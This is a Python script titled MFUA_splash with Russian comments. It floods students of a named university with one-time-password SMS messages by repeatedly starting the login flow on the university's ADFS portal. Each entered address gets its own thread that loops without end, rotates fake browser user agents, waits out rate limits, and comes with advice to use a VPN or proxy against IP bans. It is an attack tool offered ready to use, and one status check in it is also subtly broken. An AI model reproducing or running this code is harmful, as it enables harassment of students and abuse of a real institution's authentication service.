# [MFUA_splash]

"""
⚠ ~! ВНИМАНИЕ !~ ⚠
ИСПОЛЬЗУЙТЕ VPN, PROXY
ВОЗМОЖЕН БАН ПО IP
!СЕЙЧАС MFUA ДОБАВИЛА ОГРАНИЧЕНИЕ ПО ЗАПРОСАМ!

~ ~ ~ ~
MFUA_splash - это спам смсками в приложении MFUA
Версия: 1.0.3
"""

# [ИМПОРТ БИБИОТЕК]
try:
    import json # .json
    import time # время
    import random # случайные числа
    import string # буквы, числа
    import requests # запросы
    import threading # потоки
    import fake_useragent # агенты браузера
except:
    print("[ОШИБКА] > Не найдена библиотека")
    print("[РЕШЕНИЕ] >  pip install -r requirements.txt")
    exit('import error')
# - - - -



# [ГЕНЕРАТОР ССЫЛОКИ]
def make_url(mail: str):
    mail = mail.split('@')  # разделение после '@'
    stat_visit = ''.join(  random.choice(string.digits)  for _ in range(7)  )  # генерация чисел
    url = f'https://portal.mfua.ru/adfs/?AUTH_FORM=Y&TYPE=AUTH&user_name={mail[0]}%40s.mfua.ru&backurl=%2F%3Froistat_visit%3D{stat_visit}&USER_LOGIN={mail[0]}&domen=%40s.mfua.ru'
    get = requests.get(url, headers={"User-Agent": fake_useragent.UserAgent().random})  # отправка GET запроса для получения SAMLRequest

    return get.url, mail[0]  # возврат SAMLRequest
# - - - -



# [ЗАПРОС 'POST']
def post(mail: str):
    while True:
        saml, body = make_url(mail)  # получение SMALRequest
        body = f"AuthMethod=MFUA+One-time+passwords&UserName={body}%40s.mfua.ru"
        r = requests.post(saml, headers={"User-Agent": fake_useragent.UserAgent().random}, data=body)
        if r.status_code == 200:
            if 'Превышено количество попыток' in r.text:
                print(f'[{mail}] > Превышено кол. запросов')
                print('Ждём 150с')
                time.sleep(150)
            else:
                print(f'[{mail}] > + отправлено.')
        elif r.status_code == 400 or 502:
            print(f'[{mail}] > - отказ.')
        elif r.status_code == 403:
            print(f'[{mail}] > БАН')
            time.sleep(60)
        else:
            print(f'[{mail}] > {r.status_code}')
# - - - -



# [ЧТЕНИЕ ФАЙЛА]
def read(filename='config.json'):
    try:
        with open(filename, "r+", encoding='utf-8') as fike:
            return json.load(fike)
    except:
        return {}
# - - - -

# [СОЗДАНИЕ ФАЙЛА]
def create_fike(filename):
    open(filename, "w+")
# - - - -

# [ЗАПИСЬ В ФАЙЛ]
def write(data, filename='config.json'):
    with open(filename, "w+", encoding='utf-8') as fike:
        json.dump(data, fike)
# - - - -



# [ОСНОВНОЕ]
print("MFUA_splash")
print("тг: @mfua_crack")
cfg={}
u_cfg=False
if read() == {}:
    print("Хотите создать 'config.json'? (Y/n)")
    create_config = input("$ ")
    if create_config.lower() == 'y':
        create_fike('config.json')
        u_cfg=True
else:
    print("Обнаружен конфиг, хотите его использовать? (Y/n)")
    use_cfg = input("$ ")
    if use_cfg.lower() == 'y':
        cfg = read()

if cfg == {}:
    count=0
    print("Нажмите 'ctrl + c' если закончили | или напишите 'end'")
    print("(Пример: 12345678@s.mfua.ru)")
    try:
        while True:
            count+=1
            mail = input("Введите S.MFUA.RU  > ")
            if mail == 'end': exit('gg')
            cfg[str(count)] = mail
    except:
        if u_cfg: write(cfg)
        print('\nПочты записаны.')


# - -

threads=[]
for i in range(len(cfg)):
    arg = (str(read()[str(i+1)]), )
    thread = threading.Thread(target=post, args=arg, daemon=True)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()


# ~ ~ ~ ~
print("Работа завершилась.")